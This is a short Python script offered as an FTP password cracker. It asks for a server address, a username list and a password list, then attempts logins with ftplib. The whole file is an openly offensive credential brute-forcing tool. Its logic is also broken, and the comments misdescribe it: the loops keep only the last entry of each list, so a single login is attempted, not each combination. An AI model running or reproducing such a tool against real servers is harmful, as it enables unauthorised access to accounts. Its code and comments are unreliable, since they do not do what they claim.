#password cracker for an FTP server
#asks the user for the IP address of the FTP server, possible username list and password of the FTP account to be accessed.
#reads a file for a list of possible username and passwords and tries each one in an attempt to login to the FTP account.

#import ftplib module for the FTP protocol
import ftplib

#request user to input the IP address of the FTP server
server = input("FTP server IP address: ")
#request user to provide path to the username list to search through
username_list = input("Path to username list: ")
#request user to provide path to the password list the program is going to search through
password_list = input("Path to password list: ")

#this block of code attempts to crack the username and password from the username and password lists.
try:
    with open(username_list, "r") as user:
        for username in user:
            username = username.strip("\r").strip("\n")
    with open(password_list, "r") as  pw:
        for password in pw:
            password = password.strip("\r").strip("\n")
    #try block attempts to login into the FTP server
    try:
        ftp = ftplib.FTP(server)
        ftp.login(username,password)
        #if the combination of username & passsword succeeds, the next line is executed
        print("Success! The username is " + username + " and the password is " + password)
    except:
        #if the combination of the username and password results in an error, the except block is executed and the
        #next username & password in the username and password list is used to attempt login
        print("Still trying...")
#this except block is executed if any other situaton results in an error such as an invalid path to the password list.
except:
    print("Word list error")
